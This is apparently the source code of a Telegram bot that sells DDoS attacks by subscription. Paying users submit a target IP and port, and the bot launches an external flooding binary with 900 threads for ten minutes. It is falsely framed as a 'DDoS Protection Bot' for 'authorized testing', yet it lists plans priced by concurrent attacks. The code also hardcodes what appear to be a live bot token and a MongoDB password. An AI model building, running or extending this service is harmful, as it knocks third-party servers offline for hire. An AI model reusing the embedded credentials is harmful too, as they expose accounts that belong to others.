import telebot
import logging
import subprocess
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)

# Constants
TOKEN = '7713354946:AAFdS8AbgRyPgL8d_5utsURl2rMl1Y2lZro'
MONGO_URI = 'mongodb+srv://zeni:1I8uJt78Abh4K5lo@zeni.v7yls.mongodb.net/?retryWrites=true&w=majority&appName=zeni'
ADMIN_IDS = [8167507955]  # Your admin ID
OWNER_USERNAME = "@seedhe_maut_bot"
BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]
MAX_ATTACK_DURATION = 600  # 10 minutes
THREADS_COUNT = 900

# Initialize MongoDB
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['soul']
users_collection = db.users

# Initialize bot
bot = telebot.TeleBot(TOKEN)

# Global variables
user_attack_details = {}
active_attacks = {}

def is_user_admin(user_id):
    return user_id in ADMIN_IDS

def check_user_approval(user_id):
    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data and user_data.get('plan', 0) > 0:
            valid_until = user_data.get('valid_until', "")
            return valid_until == "" or datetime.now().date() <= datetime.fromisoformat(valid_until).date()
        return False
    except Exception as e:
        logging.error(f"Error checking user approval: {e}")
        return False

def get_user_plan(user_id):
    try:
        user_data = users_collection.find_one({"user_id": user_id})
        return user_data.get('plan', 0) if user_data else 0
    except Exception as e:
        logging.error(f"Error getting user plan: {e}")
        return 0

def run_attack_command_sync(user_id, target_ip, target_port, action):
    try:
        if action == 1:  # Start attack
            process = subprocess.Popen(
                ["./maut", target_ip, str(target_port), str(MAX_ATTACK_DURATION), str(THREADS_COUNT)],
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE
            )
            active_attacks[(user_id, target_ip, target_port)] = process.pid
            logging.info(f"Attack started on {target_ip}:{target_port} with PID {process.pid}")
            return True
        elif action == 2:  # Stop attack
            pid = active_attacks.pop((user_id, target_ip, target_port), None)
            if pid:
                subprocess.run(["kill", str(pid)], check=True)
                logging.info(f"Stopped attack with PID {pid}")
                return True
        return False
    except Exception as e:
        logging.error(f"Error in attack command: {e}")
        return False

def create_main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🚀 Start Attack", callback_data="start_attack"),
        InlineKeyboardButton("⏹ Stop Attack", callback_data="stop_attack"),
        InlineKeyboardButton("ℹ️ Help", callback_data="help"),
        InlineKeyboardButton("📊 My Plan", callback_data="my_plan")
    )
    return markup

def create_admin_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("👥 User Management", callback_data="user_management"),
        InlineKeyboardButton("📊 Stats", callback_data="stats"),
        InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")
    )
    return markup

def send_welcome_message(chat_id):
    welcome_msg = f"""
🌟 *Welcome to DDoS Protection Bot* 🌟

🔹 *Features:* 
   - Powerful Layer4 DDoS protection
   - Easy-to-use interface
   - Multiple plan options

📌 *Note:* This bot is for authorized testing only. Misuse will result in ban.

Use /help to see available commands.
"""
    bot.send_message(chat_id, welcome_msg, parse_mode='Markdown', reply_markup=create_main_menu())

def send_help_message(chat_id):
    help_msg = """
🆘 *Help Center* 🆘

*Available Commands:*
/start - Show main menu
/help - Show this help message
/attack - Start a new attack
/mystats - Show your usage statistics
/buy - Get information about plans

*Admin Commands* (Admin only):
/approve <user_id> <plan> <days> - Approve user
/disapprove <user_id> - Remove user approval
/stats - Show bot statistics
"""
    bot.send_message(chat_id, help_msg, parse_mode='Markdown')

def send_plan_info(chat_id, user_id):
    plan = get_user_plan(user_id)
    if plan == 0:
        plan_msg = """
📊 *Your Plan: FREE*

🔹 *Limitations:*
- Limited attack duration
- Lower priority
- No support

💎 *Upgrade your plan for full features!*
"""
    else:
        user_data = users_collection.find_one({"user_id": user_id})
        valid_until = user_data.get('valid_until', "Lifetime")
        plan_msg = f"""
📊 *Your Plan: PREMIUM (Level {plan})*

🔹 *Benefits:*
- Full attack duration
- Highest priority
- Premium support

⏳ *Valid Until:* {valid_until}

Thank you for being a premium user!
"""
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("💎 Upgrade Plan", url=f"tg://user?id={ADMIN_IDS[0]}"))
    bot.send_message(chat_id, plan_msg, parse_mode='Markdown', reply_markup=markup)

def show_stats(chat_id):
    total_users = users_collection.count_documents({})
    premium_users = users_collection.count_documents({"plan": {"$gt": 0}})
    active_attacks_count = len(active_attacks)
    
    stats_msg = f"""
📊 *Bot Statistics*

👥 *Total Users:* {total_users}
💎 *Premium Users:* {premium_users}
⚡ *Active Attacks:* {active_attacks_count}
"""
    bot.send_message(chat_id, stats_msg, parse_mode='Markdown')

# Message handlers
@bot.message_handler(commands=['start'])
def start_command(message):
    if is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "👑 *Admin Panel* 👑", 
                        parse_mode='Markdown', reply_markup=create_admin_menu())
    else:
        send_welcome_message(message.chat.id)

@bot.message_handler(commands=['help'])
def help_command(message):
    send_help_message(message.chat.id)

@bot.message_handler(commands=['mystats'])
def mystats_command(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id}) or {}
    stats_msg = f"""
📈 *Your Statistics*

🔸 *Plan Level:* {user_data.get('plan', 0)}
🔸 *Attacks Performed:* {user_data.get('attack_count', 0)}
🔸 *Last Attack:* {user_data.get('last_attack', 'Never')}
🔸 *Account Valid Until:* {user_data.get('valid_until', 'Not specified')}
"""
    bot.send_message(message.chat.id, stats_msg, parse_mode='Markdown')

@bot.message_handler(commands=['stats'])
def stats_command(message):
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "❌ *Access Denied*", parse_mode='Markdown')
        return
    show_stats(message.chat.id)

@bot.message_handler(commands=['buy'])
def buy_command(message):
    plans_msg = f"""
💎 *Available Plans* 💎

1️⃣ *Basic Plan* ($10/month)
- 10 concurrent attacks
- 5 minute max duration
- Standard support

2️⃣ *Pro Plan* ($25/month)
- 25 concurrent attacks
- 10 minute max duration
- Priority support

3️⃣ *VIP Plan* ($50/month)
- Unlimited attacks
- 30 minute max duration
- 24/7 dedicated support

📌 *Custom plans available*

Contact {OWNER_USERNAME} to purchase or for more information.
"""
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("📩 Contact Owner", url=f"tg://user?id={ADMIN_IDS[0]}"))
    bot.send_message(message.chat.id, plans_msg, parse_mode='Markdown', reply_markup=markup)

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    if not check_user_approval(user_id):
        bot.send_message(message.chat.id, "🔒 You don't have permission to use this feature!")
        return

    msg = bot.send_message(message.chat.id, """
🎯 *Attack Setup*

Please provide the target in this format:
`IP PORT`

Example:
`1.1.1.1 80`
""", parse_mode='Markdown')
    bot.register_next_step_handler(msg, process_attack_ip_port)

# Admin commands
@bot.message_handler(commands=['approve', 'disapprove'])
def admin_commands(message):
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "❌ *Access Denied*", parse_mode='Markdown')
        return

    try:
        command = message.text.split()[0][1:]
        
        if command == 'approve':
            cmd_parts = message.text.split()
            if len(cmd_parts) != 4:
                bot.send_message(message.chat.id, "ℹ️ *Usage:* `/approve <user_id> <plan(1-3)> <days>`", parse_mode='Markdown')
                return

            target_user_id = int(cmd_parts[1])
            plan = min(max(int(cmd_parts[2]), 1), 3)  # Clamp between 1-3
            days = int(cmd_parts[3])

            valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else "Lifetime"
            users_collection.update_one(
                {"user_id": target_user_id},
                {"$set": {
                    "plan": plan,
                    "valid_until": valid_until,
                    "approved_by": message.from_user.id,
                    "approved_at": datetime.now().isoformat()
                }},
                upsert=True
            )
            
            response_msg = f"""
✅ *User Approved*
🔹 *ID:* `{target_user_id}`
🔹 *Plan:* {plan}
🔹 *Duration:* {days} days
🔹 *Valid Until:* {valid_until}
"""
            bot.send_message(message.chat.id, response_msg, parse_mode='Markdown')
            
            # Notify the user
            try:
                bot.send_message(target_user_id, f"""
🎉 *Your account has been approved!*

🔹 *Plan Level:* {plan}
🔹 *Valid Until:* {valid_until}

You can now use all bot features.
""", parse_mode='Markdown')
            except Exception as e:
                logging.error(f"Could not notify user {target_user_id}: {e}")

        elif command == 'disapprove':
            cmd_parts = message.text.split()
            if len(cmd_parts) != 2:
                bot.send_message(message.chat.id, "ℹ️ *Usage:* `/disapprove <user_id>`", parse_mode='Markdown')
                return

            target_user_id = int(cmd_parts[1])
            users_collection.update_one(
                {"user_id": target_user_id},
                {"$set": {
                    "plan": 0, 
                    "valid_until": "", 
                    "disapproved_at": datetime.now().isoformat(),
                    "disapproved_by": message.from_user.id
                }}
            )
            bot.send_message(message.chat.id, f"❌ *User `{target_user_id}` has been disapproved*", parse_mode='Markdown')
            
            # Notify the user
            try:
                bot.send_message(target_user_id, """
⚠️ *Your account access has been revoked*

Your plan has been downgraded to Free. 
Contact admin for more information.
""", parse_mode='Markdown')
            except Exception as e:
                logging.error(f"Could not notify user {target_user_id}: {e}")

    except Exception as e:
        error_msg = f"❌ *Error:* {str(e)}"
        bot.send_message(message.chat.id, error_msg, parse_mode='Markdown')
        logging.error(f"Error in admin_commands: {e}")

# Callback handlers
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    try:
        if call.data == "start_attack":
            user_id = call.from_user.id
            if not check_user_approval(user_id):
                bot.answer_callback_query(call.id, "🔒 You don't have permission to use this feature!", show_alert=True)
                return

            msg = bot.send_message(call.message.chat.id, """
🎯 *Attack Setup*

Please provide the target in this format:
`IP PORT`

Example:
`1.1.1.1 80`
""", parse_mode='Markdown')
            bot.register_next_step_handler(msg, process_attack_ip_port)
            bot.answer_callback_query(call.id)
            
        elif call.data == "stop_attack":
            user_id = call.from_user.id
            attack_details = user_attack_details.get(user_id)
            
            if not attack_details:
                bot.answer_callback_query(call.id, "❌ No active attack found!", show_alert=True)
                return
            
            target_ip, target_port = attack_details
            if run_attack_command_sync(user_id, target_ip, target_port, 2):
                bot.answer_callback_query(call.id, f"🛑 Attack stopped on {target_ip}:{target_port}")
                user_attack_details.pop(user_id, None)
            else:
                bot.answer_callback_query(call.id, "❌ Failed to stop attack!", show_alert=True)
                
        elif call.data == "help":
            send_help_message(call.message.chat.id)
            bot.answer_callback_query(call.id)
            
        elif call.data == "my_plan":
            send_plan_info(call.message.chat.id, call.from_user.id)
            bot.answer_callback_query(call.id)
            
        elif call.data == "user_management":
            if is_user_admin(call.from_user.id):
                markup = InlineKeyboardMarkup()
                markup.add(
                    InlineKeyboardButton("📝 Approve User", callback_data="admin_approve"),
                    InlineKeyboardButton("❌ Disapprove User", callback_data="admin_disapprove"),
                    InlineKeyboardButton("📊 List Users", callback_data="admin_list_users")
                )
                bot.edit_message_text("👥 *User Management*", call.message.chat.id, call.message.message_id, 
                                    parse_mode='Markdown', reply_markup=markup)
            else:
                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
                
        elif call.data == "stats":
            if is_user_admin(call.from_user.id):
                show_stats(call.message.chat.id)
                bot.answer_callback_query(call.id)
            else:
                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
                
        elif call.data == "main_menu":
            if is_user_admin(call.from_user.id):
                bot.edit_message_text("👑 *Admin Panel*", call.message.chat.id, call.message.message_id,
                                    parse_mode='Markdown', reply_markup=create_admin_menu())
            else:
                bot.edit_message_text("🌟 *Main Menu*", call.message.chat.id, call.message.message_id,
                                   parse_mode='Markdown', reply_markup=create_main_menu())
                
        elif call.data.startswith("confirm_attack_"):
            user_id = int(call.data.split("_")[2])
            if call.from_user.id != user_id:
                bot.answer_callback_query(call.id, "❌ This is not your attack!", show_alert=True)
                return
                
            attack_details = user_attack_details.get(user_id)
            if not attack_details:
                bot.answer_callback_query(call.id, "❌ Attack details not found!", show_alert=True)
                return
                
            target_ip, target_port = attack_details
            if run_attack_command_sync(user_id, target_ip, target_port, 1):
                # Update user stats
                users_collection.update_one(
                    {"user_id": user_id},
                    {
                        "$inc": {"attack_count": 1},
                        "$set": {"last_attack": datetime.now().isoformat()}
                    },
                    upsert=True
                )
                
                bot.edit_message_text(
                    f"""
✅ *Attack Launched!*

🔹 *Target:* `{target_ip}:{target_port}`
🔹 *Duration:* `{MAX_ATTACK_DURATION//60} minutes`
🔹 *Threads:* `{THREADS_COUNT}`

⚠️ *Attack will automatically stop after {MAX_ATTACK_DURATION//60} minutes*
""",
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='Markdown'
                )
            else:
                bot.answer_callback_query(call.id, "❌ Failed to start attack!", show_alert=True)
                
        elif call.data == "cancel_attack":
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.answer_callback_query(call.id, "Attack canceled")
            
        elif call.data == "admin_approve":
            if is_user_admin(call.from_user.id):
                bot.send_message(call.message.chat.id, "ℹ️ *Usage:* `/approve <user_id> <plan(1-3)> <days>`", parse_mode='Markdown')
                bot.answer_callback_query(call.id)
            else:
                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
                
        elif call.data == "admin_disapprove":
            if is_user_admin(call.from_user.id):
                bot.send_message(call.message.chat.id, "ℹ️ *Usage:* `/disapprove <user_id>`", parse_mode='Markdown')
                bot.answer_callback_query(call.id)
            else:
                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
                
        elif call.data == "admin_list_users":
            if is_user_admin(call.from_user.id):
                premium_users = list(users_collection.find({"plan": {"$gt": 0}}).limit(10))
                users_list = "\n".join([
                    f"🔹 `{u['user_id']}` - Plan {u['plan']} (Until {u.get('valid_until', '?')})"
                    for u in premium_users
                ])
                bot.send_message(
                    call.message.chat.id,
                    f"💎 *Premium Users*\n{users_list}\n\nTotal: {len(premium_users)}",
                    parse_mode='Markdown'
                )
                bot.answer_callback_query(call.id)
            else:
                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
                
    except Exception as e:
        logging.error(f"Error in callback handler: {e}")
        bot.answer_callback_query(call.id, "❌ An error occurred", show_alert=True)

def process_attack_ip_port(message):
    try:
        user_id = message.from_user.id
        args = message.text.split()
        
        if len(args) != 2:
            bot.send_message(message.chat.id, "❌ *Invalid format!* Use: `IP PORT`", parse_mode='Markdown')
            return

        target_ip, target_port = args[0], int(args[1])
        
        if target_port in BLOCKED_PORTS:
            bot.send_message(message.chat.id, f"🚫 *Port {target_port} is blocked*", parse_mode='Markdown')
            return

        user_attack_details[user_id] = (target_ip, target_port)
        
        # Confirm attack details
        confirm_msg = f"""
🔍 *Attack Details Confirmation*

🔹 *Target IP:* `{target_ip}`
🔹 *Target Port:* `{target_port}`
🔹 *Duration:* `{MAX_ATTACK_DURATION//60} minutes`
🔹 *Threads:* `{THREADS_COUNT}`

⚠️ *Are you sure you want to proceed?*
"""
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_attack_{user_id}"),
            InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")
        )
        bot.send_message(message.chat.id, confirm_msg, parse_mode='Markdown', reply_markup=markup)

    except ValueError:
        bot.send_message(message.chat.id, "❌ *Invalid port number!*", parse_mode='Markdown')
    except Exception as e:
        error_msg = f"❌ *Error:* {str(e)}"
        bot.send_message(message.chat.id, error_msg, parse_mode='Markdown')
        logging.error(f"Error in process_attack_ip_port: {e}")

# Start the bot
if __name__ == "__main__":
    logging.info("Starting bot...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Bot crashed: {e}")
